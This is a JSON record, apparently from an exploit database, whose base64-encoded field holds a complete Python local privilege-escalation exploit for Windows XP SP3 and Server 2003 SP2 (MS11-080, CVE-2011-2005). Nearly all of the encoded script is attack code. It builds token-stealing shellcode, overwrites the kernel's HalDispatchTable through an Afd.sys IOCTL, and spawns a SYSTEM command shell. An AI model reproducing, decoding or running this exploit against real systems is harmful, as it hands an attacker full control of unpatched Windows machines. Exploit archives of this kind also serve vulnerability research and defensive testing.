{
    "source": "exploit-database", 
    "exploit": "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyBNUzExLTA4MCAtIENWRS0yMDExLTIwMDUgQWZkLnN5cyBQcml2aWxlZ2UgRXNjYWxhdGlvbiBFeHBsb2l0ICMjIyMjIyMjDQojIyMjIyMjIyMgICAgICAgICBBdXRob3I6IHJ5dWppbkBvZmZzZWMuY29tIC0gTWF0dGVvIE1lbWVsbGkgICAgICAgICAgICAjIyMjIyMjIw0KIyMjIyMjIyMjICAgICAgICAgICAgICAgICAgICAgIFNwYWdoZXR0aSAmIFB3bnNhdWNlICAgICAgICAgICAgICAgICAgICAgIyMjIyMjIyMNCiMjIyMjIyMjIyAgICAgICAgICAgICAgeXVjayEgMHhiYWFkZjAwZCBFbHdvb2RAbWFjJmNoZWVzZS5jb20gICAgICAgICAgICMjIyMjIyMjDQojIyMjIyMjIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIyMjIyMjIw0KIyMjIyMjIyMjICAgICAgVGh4IHRvIGRvb2tpZShsaWZlc2F2ZXIpMjAwMGNhLCBkaWppdGFsMSBhbmQgcm9uaW4gICAgICAgIyMjIyMjIyMNCiMjIyMjIyMjIyAgICAgICAgICAgICAgICAgICAgICAgIGZvciBoZWxwaW5nIG91dCEgICAgICAgICAgICAgICAgICAgICAgICMjIyMjIyMjDQojIyMjIyMjIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIyMjIyMjIw0KIyMjIyMjIyMjICAgICAgICAgICAgICAgICAgIFRvIG15IE1hc3RlciBTaGlmdSBtdXRzOiAgICAgICAgICAgICAgICAgICAgIyMjIyMjIyMNCiMjIyMjIyMjIyAgICAgICAgICAgIlNvIHRoYXQncyBpdCwgSSBqdXN0IG5lZWQgaW5uZXIgcGVhY2U/IiA7KSAgICAgICAgICMjIyMjIyMjDQojIyMjIyMjIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIyMjIyMjIw0KIyMjIyMjIyMjICAgICAgICBFeHBsb2l0IHRlc3RlZCBvbiB0aGUgZm9sbG93aW5nIDMyYml0cyBzeXN0ZW1zOiAgICAgICAgIyMjIyMjIyMNCiMjIyMjIyMjIyAgICAgICBXaW4gWFBTUDMgRW5nLCBXaW4gMkszU1AyIFN0YW5kYXJkL0VudGVycHJpc2UgRW5nICAgICAgICMjIyMjIyMjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQpmcm9tIGN0eXBlcyBpbXBvcnQgKHdpbmRsbCwgQ0RMTCwgU3RydWN0dXJlLCBieXJlZiwgc2l6ZW9mLCBQT0lOVEVSLA0KICAgICAgICAgICAgICAgICAgICBjX2NoYXIsIGNfc2hvcnQsIGNfdXNob3J0LCBjX2ludCwgY191aW50LCBjX3Vsb25nLA0KICAgICAgICAgICAgICAgICAgICBjX3ZvaWRfcCwgY19sb25nLCBjX2NoYXJfcCkNCmZyb20gY3R5cGVzLndpbnR5cGVzIGltcG9ydCBIQU5ETEUsIERXT1JEDQppbXBvcnQgc29ja2V0LCB0aW1lLCBvcywgc3RydWN0LCBzeXMNCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KDQp1c2FnZSA9ICAiJXByb2cgLU8gVEFSR0VUX09TIg0KcGFyc2VyID0gT3B0aW9uUGFyc2VyKHVzYWdlPXVzYWdlKQ0KcGFyc2VyLmFkZF9vcHRpb24oIi1PIiwgIi0tdGFyZ2V0LW9zIiwgdHlwZT0ic3RyaW5nIiwNCiAgICAgICAgICAgICAgICAgIGFjdGlvbj0ic3RvcmUiLCBkZXN0PSJ0YXJnZXRfb3MiLA0KICAgICAgICAgICAgICAgICAgaGVscD0iVGFyZ2V0IE9TLiBBY2NlcHRlZCB2YWx1ZXM6IFhQLCAySzMiKQ0KKG9wdGlvbnMsIGFyZ3MpID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KT1MgPSBvcHRpb25zLnRhcmdldF9vcw0KaWYgbm90IE9TIG9yIE9TLnVwcGVyKCkgbm90IGluIFsnWFAnLCcySzMnXToNCiAgIHBhcnNlci5wcmludF9oZWxwKCkNCiAgIHN5cy5leGl0KCkNCk9TID0gT1MudXBwZXIoKQ0KDQprZXJuZWwzMiA9IHdpbmRsbC5rZXJuZWwzMg0KbnRkbGwgICAgPSB3aW5kbGwubnRkbGwNClBzYXBpICAgID0gd2luZGxsLlBzYXBpDQoNCmRlZiBmaW5kU3lzQmFzZShkcnZuYW1lPU5vbmUpOiANCiAgICBBUlJBWV9TSVpFICAgICAgICAgICAgPSAxMDI0IA0KICAgIG15YXJyYXkgICAgICAgICAgICAgICA9IGNfdWxvbmcgKiBBUlJBWV9TSVpFICANCiAgICBscEltYWdlQmFzZSAgICAgICAgICAgPSBteWFycmF5KCkgIA0KICAgIGNiICAgICAgICAgICAgICAgICAgICA9IGNfaW50KDEwMjQpICANCiAgICBscGNiTmVlZGVkICAgICAgICAgICAgPSBjX2xvbmcoKSAgDQogICAgZHJpdmVybmFtZV9zaXplICAgICAgID0gY19sb25nKCkgIA0KICAgIGRyaXZlcm5hbWVfc2l6ZS52YWx1ZSA9IDQ4IA0KICAgIFBzYXBpLkVudW1EZXZpY2VEcml2ZXJzKGJ5cmVmKGxwSW1hZ2VCYXNlKSwgY2IsIGJ5cmVmKGxwY2JOZWVkZWQpKSAgDQogICAgZm9yIGJhc2VhZGR5IGluIGxwSW1hZ2VCYXNlOiAgDQogICAgICAgIGRyaXZlcm5hbWUgPSBjX2NoYXJfcCgiXHgwMCIqZHJpdmVybmFtZV9zaXplLnZhbHVlKSAgDQogICAgICAgIGlmIGJhc2VhZGR5OiAgDQogICAgICAgICAgICBQc2FwaS5HZXREZXZpY2VEcml2ZXJCYXNlTmFtZUEoYmFzZWFkZHksIGRyaXZlcm5hbWUsICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkcml2ZXJuYW1lX3NpemUudmFsdWUpDQogICAgICAgICAgICBpZiBkcnZuYW1lOg0KICAgICAgICAgICAgICAgIGlmIGRyaXZlcm5hbWUudmFsdWUubG93ZXIoKSA9PSBkcnZuYW1lOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAiWytdIFJldHJpZXZpbmcgJXMgaW5mby4uLiIgJSBkcnZuYW1lDQogICAgICAgICAgICAgICAgICAgIHByaW50ICJbK10gJXMgYmFzZSBhZGRyZXNzOiAlcyIgJSAoZHJ2bmFtZSwgaGV4KGJhc2VhZGR5KSkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJhc2VhZGR5DQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGlmIGRyaXZlcm5hbWUudmFsdWUubG93ZXIoKS5maW5kKCJrcm5sIikgIT0tMToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBSZXRyaWV2aW5nIEtlcm5lbCBpbmZvLi4uIg0KICAgICAgICAgICAgICAgICAgICBwcmludCAiWytdIEtlcm5lbCB2ZXJzaW9uOiIsIGRyaXZlcm5hbWUudmFsdWUNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBLZXJuZWwgYmFzZSBhZGRyZXNzOiAlcyIgJSBoZXgoYmFzZWFkZHkpICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChiYXNlYWRkeSwgZHJpdmVybmFtZS52YWx1ZSkNCiAgICByZXR1cm4gTm9uZQ0KDQpwcmludCAiWz5dIE1TMTEtMDgwIFByaXZpbGVnZSBFc2NhbGF0aW9uIEV4cGxvaXQiDQpwcmludCAiWz5dIE1hdHRlbyBNZW1lbGxpIC0gcnl1amluQG9mZnNlYy5jb20iDQpwcmludCAiWz5dIFJlbGVhc2UgRGF0ZSAyOC8xMS8yMDExIg0KDQpXU0FHZXRMYXN0RXJyb3IgICAgICAgICAgPSB3aW5kbGwuV3MyXzMyLldTQUdldExhc3RFcnJvcg0KV1NBR2V0TGFzdEVycm9yLmFyZ3R5cGVzID0gKCkNCldTQUdldExhc3RFcnJvci5yZXN0eXBlICA9IGNfaW50DQpTT0NLRVQgICAgICAgICAgICAgICAgICAgPSBjX2ludA0KV1NBU29ja2V0ICAgICAgICAgICAgICAgID0gd2luZGxsLldzMl8zMi5XU0FTb2NrZXRBDQpXU0FTb2NrZXQuYXJndHlwZXMgICAgICAgPSAoY19pbnQsIGNfaW50LCBjX2ludCwgY192b2lkX3AsIGNfdWludCwgRFdPUkQpDQpXU0FTb2NrZXQucmVzdHlwZSAgICAgICAgPSBTT0NLRVQNCmNsb3Nlc29ja2V0ICAgICAgICAgICAgICA9IHdpbmRsbC5XczJfMzIuY2xvc2Vzb2NrZXQNCmNsb3Nlc29ja2V0LmFyZ3R5cGVzICAgICA9IChTT0NLRVQsKQ0KY2xvc2Vzb2NrZXQucmVzdHlwZSAgICAgID0gY19pbnQNCmNvbm5lY3QgICAgICAgICAgICAgICAgICA9IHdpbmRsbC5XczJfMzIuY29ubmVjdA0KY29ubmVjdC5hcmd0eXBlcyAgICAgICAgID0gKFNPQ0tFVCwgY192b2lkX3AsIGNfaW50KQ0KY29ubmVjdC5yZXN0eXBlICAgICAgICAgID0gY19pbnQNCg0KY2xhc3Mgc29ja2FkZHJfaW4oU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCJzaW5fZmFtaWx5IiwgY19zaG9ydCksDQogICAgICAgICgic2luX3BvcnQiLCBjX3VzaG9ydCksDQogICAgICAgICgic2luX2FkZHIiLCBjX3Vsb25nKSwNCiAgICAgICAgKCJzaW5femVybyIsIGNfY2hhciAqIDgpLA0KICAgICAgICBdDQoNCiMjIENyZWF0ZSBvdXIgZGV2aWNlaW9jb250cm9sIHNvY2tldCBoYW5kbGUNCmNsaWVudCA9IFdTQVNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNLCBzb2NrZXQuSVBQUk9UT19UQ1AsDQogICAgICAgICAgICAgICAgICAgTm9uZSwgMCwgMCkNCmlmIGNsaWVudCA9PSB+MDoNCiAgICByYWlzZSBPU0Vycm9yLCAiV1NBU29ja2V0OiAlcyIgJSAoV1NBR2V0TGFzdEVycm9yKCksKQ0KdHJ5Og0KICAgIGFkZHIgPSBzb2NrYWRkcl9pbigpDQogICAgYWRkci5zaW5fZmFtaWx5ID0gc29ja2V0LkFGX0lORVQNCiAgICBhZGRyLnNpbl9wb3J0ID0gc29ja2V0Lmh0b25zKDQ0NTUpDQogICAgYWRkci5zaW5fYWRkciA9IHNvY2tldC5odG9ubCgweDdmMDAwMDAxKSAjIDEyNy4wLjAuMQ0KICAgICMjIFdlIG5lZWQgdG8gY29ubmVjdCB0byBhIGNsb3NlZCBwb3J0LCBzb2NrZXQgc3RhdGUgbXVzdCBiZSBDT05ORUNUSU5HDQogICAgY29ubmVjdChjbGllbnQsIGJ5cmVmKGFkZHIpLCBzaXplb2YoYWRkcikpDQpleGNlcHQ6DQogICAgY2xvc2Vzb2NrZXQoY2xpZW50KQ0KICAgIHJhaXNlDQoNCmJhc2VhZGQgICAgPSBjX2ludCgweDEwMDEpDQpNRU1SRVMgICAgID0gKDB4MTAwMCB8IDB4MjAwMCkNClBBR0VFWEUgICAgPSAweDAwMDAwMDQwDQpaZXJvYml0cyAgID0gY19pbnQoMCkNClJlZ2lvblNpemUgPSBjX2ludCgweDEwMDApDQp3cml0dGVuICAgID0gY19pbnQoMCkNCiMjIFRoaXMgd2lsbCB0cmlnZ2VyIHRoZSBwYXRoIHRvIEFmZFJlc3RhcnRKb2luDQppcnBzdHVmZiAgID0gKCJceDQxXHg0MVx4NDFceDQxXHg0Mlx4NDJceDQyXHg0MiINCiAgICAgICAgICAgICAgIlx4MDBceDAwXHgwMFx4MDBceDQ0XHg0NFx4NDRceDQ0Ig0KICAgICAgICAgICAgICAiXHgwMVx4MDBceDAwXHgwMCINCiAgICAgICAgICAgICAgIlx4ZThceDAwIiArICI0IiArICJceGYwXHgwMCIgKyAiXHg0NSIqMjMxKQ0KIyMgQWxsb2NhdGUgc3BhY2UgZm9yIHRoZSBpbnB1dCBidWZmZXINCmR3U3RhdHVzID0gbnRkbGwuTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkoLTEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnlyZWYoYmFzZWFkZCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5cmVmKFJlZ2lvblNpemUpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1FTVJFUywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQUdFRVhFKQ0KIyBDb3B5IGlucHV0IGJ1ZmZlciB0byBpdA0Ka2VybmVsMzIuV3JpdGVQcm9jZXNzTWVtb3J5KC0xLCAweDEwMDAsIGlycHN0dWZmLCAweDEwMCwgYnlyZWYod3JpdHRlbikpDQpzdGFydFBhZ2UgPSBjX2ludCgweDAwMDIwMDAwKQ0Ka2VybmVsMzIuVmlydHVhbFByb3RlY3Qoc3RhcnRQYWdlLCAweDEwMDAsIFBBR0VFWEUsIGJ5cmVmKHdyaXR0ZW4pKQ0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEtFUk5FTCBJTkZPICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCmxwRHJpdmVyICAgICA9IGNfY2hhcl9wKCkNCmxwUGF0aCAgICAgICA9IGNfY2hhcl9wKCkNCmxwRHJ2QWRkcmVzcyA9IGNfbG9uZygpDQooa3JubGJhc2UsIGtlcm5lbHZlcikgPSBmaW5kU3lzQmFzZSgpDQpoS2VybmVsID0ga2VybmVsMzIuTG9hZExpYnJhcnlFeEEoa2VybmVsdmVyLCAwLCAxKQ0KSGFsRGlzcGF0Y2hUYWJsZSA9IGtlcm5lbDMyLkdldFByb2NBZGRyZXNzKGhLZXJuZWwsICJIYWxEaXNwYXRjaFRhYmxlIikNCkhhbERpc3BhdGNoVGFibGUgLT0gaEtlcm5lbA0KSGFsRGlzcGF0Y2hUYWJsZSArPSBrcm5sYmFzZQ0KcHJpbnQgIlsrXSBIYWxEaXNwYXRjaFRhYmxlIGFkZHJlc3M6IiwgaGV4KEhhbERpc3BhdGNoVGFibGUpDQpoYWxiYXNlID0gZmluZFN5c0Jhc2UoImhhbC5kbGwiKQ0KIyMgV2luWFAgU1AzDQppZiBPUyA9PSAiWFAiOg0KICAgIEhhbGlRdWVyeVN5c3RlbUluZm9ybWF0aW9uID0gaGFsYmFzZSsweDE2YmJhICMgT2Zmc2V0IGZvciBYUFNQMw0KICAgIEhhbHBTZXRTeXN0ZW1JbmZvcm1hdGlvbiAgID0gaGFsYmFzZSsweDE5NDM2ICMgT2Zmc2V0IGZvciBYUFNQMw0KIyMgV2luMmszIFNQMg0KZWxzZToNCiAgICBIYWxpUXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiA9IGhhbGJhc2UrMHgxZmExZSAjIE9mZnNldCBmb3IgV0lOMkszDQogICAgSGFscFNldFN5c3RlbUluZm9ybWF0aW9uICAgPSBoYWxiYXNlKzB4MjFjNjAgIyBPZmZzZXQgZm9yIFdJTjJLMw0KcHJpbnQgIlsrXSBIYWxpUXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiBhZGRyZXNzOiIsIGhleChIYWxpUXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikNCnByaW50ICJbK10gSGFscFNldFN5c3RlbUluZm9ybWF0aW9uIGFkZHJlc3M6IiwgaGV4KEhhbHBTZXRTeXN0ZW1JbmZvcm1hdGlvbikNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEVYUExPSVRBVElPTiAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCnNoZWxsY29kZV9hZGRyZXNzX2RlcCAgID0gMHgwMDAyMDcxZQ0Kc2hlbGxjb2RlX2FkZHJlc3Nfbm9kZXAgPSAweDAwMDIwN2I4DQpwYWRkaW5nICAgICAgICAgICA9ICJceDkwIioyDQpIYWxEaXNwYXRjaFRhYmxlMHg0ID0gSGFsRGlzcGF0Y2hUYWJsZSArIDB4NA0KSGFsRGlzcGF0Y2hUYWJsZTB4OCA9IEhhbERpc3BhdGNoVGFibGUgKyAweDgNCiMjIHRva2VuYmthZGRyICAgICAgPSAweDAwMDIwOTAwDQppZiBPUyA9PSAiWFAiOg0KICAgIF9LUFJPQ0VTUyA9ICJceDQ0Ig0KICAgIF9UT0tFTiAgICA9ICJceGM4Ig0KICAgIF9VUElEICAgICA9ICJceDg0Ig0KICAgIF9BUExJTktTICA9ICJceDg4Ig0KZWxzZToNCiAgICBfS1BST0NFU1MgPSAiXHgzOCINCiAgICBfVE9LRU4gICAgPSAiXHhkOCINCiAgICBfVVBJRCAgICAgPSAiXHg5NCINCiAgICBfQVBMSU5LUyAgPSAiXHg5OCINCiAgICANCnJlc3RvcmVfcHRycyA9ICAgIlx4MzFceGMwIiArIFwNCiAgICAgICAgICAgICAgICAgIlx4YjgiICsgc3RydWN0LnBhY2soIkwiLCBIYWxwU2V0U3lzdGVtSW5mb3JtYXRpb24pICsgXA0KICAgICAgICAgICAgICAgICAiXHhhMyIgKyBzdHJ1Y3QucGFjaygiTCIsIEhhbERpc3BhdGNoVGFibGUweDgpICsgXA0KICAgICAgICAgICAgICAgICAiXHhiOCIgKyBzdHJ1Y3QucGFjaygiTCIsIEhhbGlRdWVyeVN5c3RlbUluZm9ybWF0aW9uKSArIFwNCiAgICAgICAgICAgICAgICAgIlx4YTMiICsgc3RydWN0LnBhY2soIkwiLCBIYWxEaXNwYXRjaFRhYmxlMHg0KQ0KdG9rZW5zdGVhbGluZyA9ICAiXHg1MiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg1MyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHgzM1x4YzAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg2NFx4OGJceDgwXHgyNFx4MDFceDAwXHgwMCIgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4Ylx4NDAiICsgX0tQUk9DRVNTICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4Ylx4YzgiICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4Ylx4OTgiICsgX1RPS0VOICsgIlx4MDBceDAwXHgwMCIgICArXA0KICAgICAgICAgICAgICAgICAiXHg4OVx4MWRceDAwXHgwOVx4MDJceDAwIiAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4Ylx4ODAiICsgX0FQTElOS1MgKyAiXHgwMFx4MDBceDAwIiArXA0KICAgICAgICAgICAgICAgICAiXHg4MVx4ZTgiICsgX0FQTElOS1MgKyAiXHgwMFx4MDBceDAwIiArXA0KICAgICAgICAgICAgICAgICAiXHg4MVx4YjgiICsgX1VQSUQgKyAiXHgwMFx4MDBceDAwXHgwNFx4MDBceDAwXHgwMCIgK1wNCiAgICAgICAgICAgICAgICAgIlx4NzVceGU4IiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgK1wNCiAgICAgICAgICAgICAgICAgIlx4OGJceDkwIiArIF9UT0tFTiArICJceDAwXHgwMFx4MDAiICAgK1wNCiAgICAgICAgICAgICAgICAgIlx4OGJceGMxIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgK1wNCiAgICAgICAgICAgICAgICAgIlx4ODlceDkwIiArIF9UT0tFTiArICJceDAwXHgwMFx4MDAiICAgK1wNCiAgICAgICAgICAgICAgICAgIlx4NWIiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgK1wNCiAgICAgICAgICAgICAgICAgIlx4NWEiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgK1wNCiAgICAgICAgICAgICAgICAgIlx4YzJceDEwIg0KcmVzdG9yZV90b2tlbiA9ICAiXHg1MiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHgzM1x4YzAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg2NFx4OGJceDgwXHgyNFx4MDFceDAwXHgwMCIgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4Ylx4NDAiICsgX0tQUk9DRVNTICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4Ylx4MTVceDAwXHgwOVx4MDJceDAwIiAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHg4OVx4OTAiICsgX1RPS0VOICsgIlx4MDBceDAwXHgwMCIgICArXA0KICAgICAgICAgICAgICAgICAiXHg1YSIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArXA0KICAgICAgICAgICAgICAgICAiXHhjMlx4MTAiDQogICAgICAgICAgICAgICAgIA0Kc2hlbGxjb2RlICAgICAgICAgPSBwYWRkaW5nICsgcmVzdG9yZV9wdHJzICsgdG9rZW5zdGVhbGluZw0Kc2hlbGxjb2RlX3NpemUgICAgPSBsZW4oc2hlbGxjb2RlKQ0Kb3JpZ19zaXplICAgICAgICAgPSBzaGVsbGNvZGVfc2l6ZQ0KIyBXcml0ZSBzaGVsbGNvZGUgaW4gdXNlcnNwYWNlIChkZXApDQprZXJuZWwzMi5Xcml0ZVByb2Nlc3NNZW1vcnkoLTEsIHNoZWxsY29kZV9hZGRyZXNzX2RlcCwgc2hlbGxjb2RlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaGVsbGNvZGVfc2l6ZSwgYnlyZWYod3JpdHRlbikpDQojIFdyaXRlIHNoZWxsY29kZSBpbiB1c2Vyc3BhY2UgKihub2RlcCkNCmtlcm5lbDMyLldyaXRlUHJvY2Vzc01lbW9yeSgtMSwgc2hlbGxjb2RlX2FkZHJlc3Nfbm9kZXAsIHNoZWxsY29kZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGxjb2RlX3NpemUsIGJ5cmVmKHdyaXR0ZW4pKQ0KIyMgVHJpZ2dlciBQb2ludGVyIE92ZXJ3cml0ZSANCnByaW50ICJbKl0gVHJpZ2dlcmluZyBBRkRKb2luTGVhZiBwb2ludGVyIG92ZXJ3cml0ZS4uLiINCklPQ1RMICAgICAgICAgICAgID0gMHgwMDAxMjBiYiAgICAgICAgICAgICAgICAjIEFGREpvaW5MZWFmDQppbnB1dGJ1ZmZlciAgICAgICA9IDB4MTAwNA0KaW5wdXRidWZmZXJfc2l6ZSAgPSAweDEwOA0Kb3V0cHV0YnVmZmVyX3NpemUgPSAweDAgICAgICAgICAgICAgICAgICAgICAgICMgQnlwYXNzIFByb2JlIGZvciBXcml0ZQ0Kb3V0cHV0YnVmZmVyICAgICAgPSBIYWxEaXNwYXRjaFRhYmxlMHg0ICsgMHgxICMgSGFsRGlzcGF0Y2hUYWJsZSsweDQrMQ0KSW9TdGF0dXNCbG9jayA9IGNfdWxvbmcoKQ0KTlRTVEFUVVMgPSBudGRsbC5ad0RldmljZUlvQ29udHJvbEZpbGUoY2xpZW50LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTm9uZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5vbmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOb25lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnlyZWYoSW9TdGF0dXNCbG9jayksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJT0NUTCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0YnVmZmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5wdXRidWZmZXJfc2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dGJ1ZmZlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dGJ1ZmZlcl9zaXplDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApDQojIyBUcmlnZ2VyIHNoZWxsY29kZQ0KaW5wICA9IGNfdWxvbmcoKQ0Kb3V0ICA9IGNfdWxvbmcoKSANCmlucCAgPSAweDEzMzcNCmhvbGEgPSBudGRsbC5OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKGlucCwgYnlyZWYob3V0KSkNCiMjIFNwYXduIGEgc3lzdGVtIHNoZWxsLCB3MDB0IQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBhIFNZU1RFTSBzaGVsbC4uLiINCm9zLnN5c3RlbSgiY21kLmV4ZSAvVDpDMCAvSyBjZCBjOlxcd2luZG93c1xcc3lzdGVtMzIiKQ0KDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgUE9TVCBFWFBMT0lUQVRJT04gIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KcHJpbnQgIlsqXSBSZXN0b3JpbmcgdG9rZW4uLi4iDQojIyBSZXN0b3JlIHRoZSB0aGluZ2llDQpzaGVsbGNvZGUgICAgICAgICA9IHBhZGRpbmcgKyByZXN0b3JlX3B0cnMgKyByZXN0b3JlX3Rva2VuDQpzaGVsbGNvZGVfc2l6ZSAgICA9IGxlbihzaGVsbGNvZGUpDQp0cmFpbF9wYWRkaW5nICAgICA9IChvcmlnX3NpemUgLSBzaGVsbGNvZGVfc2l6ZSkgKiAiXHgwMCINCnNoZWxsY29kZSAgICAgICAgKz0gdHJhaWxfcGFkZGluZw0Kc2hlbGxjb2RlX3NpemUgICArPSAob3JpZ19zaXplIC0gc2hlbGxjb2RlX3NpemUpDQojIyBXcml0ZSByZXN0b3JlIHNoZWxsY29kZSBpbiB1c2Vyc3BhY2UgKGRlcCkNCmtlcm5lbDMyLldyaXRlUHJvY2Vzc01lbW9yeSgtMSwgc2hlbGxjb2RlX2FkZHJlc3NfZGVwLCBzaGVsbGNvZGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNoZWxsY29kZV9zaXplLCBieXJlZih3cml0dGVuKSkNCiMjIFdyaXRlIHJlc3RvcmUgc2hlbGxjb2RlIGluIHVzZXJzcGFjZSAobm9kZXApDQprZXJuZWwzMi5Xcml0ZVByb2Nlc3NNZW1vcnkoLTEsIHNoZWxsY29kZV9hZGRyZXNzX25vZGVwLCBzaGVsbGNvZGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNoZWxsY29kZV9zaXplLCBieXJlZih3cml0dGVuKSkNCiMjIE92ZXJ3cml0ZSBIYWxEaXNwYXRjaFRhYmxlIG9uY2UgYWdhaW4NCk5UU1RBVFVTID0gbnRkbGwuWndEZXZpY2VJb0NvbnRyb2xGaWxlKGNsaWVudCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5vbmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOb25lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTm9uZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5cmVmKElvU3RhdHVzQmxvY2spLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSU9DVEwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnB1dGJ1ZmZlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0YnVmZmVyX3NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRidWZmZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRidWZmZXJfc2l6ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQ0KIyMgVHJpZ2dlciByZXN0b3JlIHNoZWxsY29kZQ0KaG9sYSA9IG50ZGxsLk50UXVlcnlJbnRlcnZhbFByb2ZpbGUoaW5wLCBieXJlZihvdXQpKQ0KcHJpbnQgIlsrXSBSZXN0b3JlIGRvbmUhIEhhdmUgYSBuaWNlIGRheSA6KSI=", 
    "filename": "platforms/windows/local/18176.py", 
    "id": "18176", 
    "cves": [
        "CVE-2011-2005"
    ]
}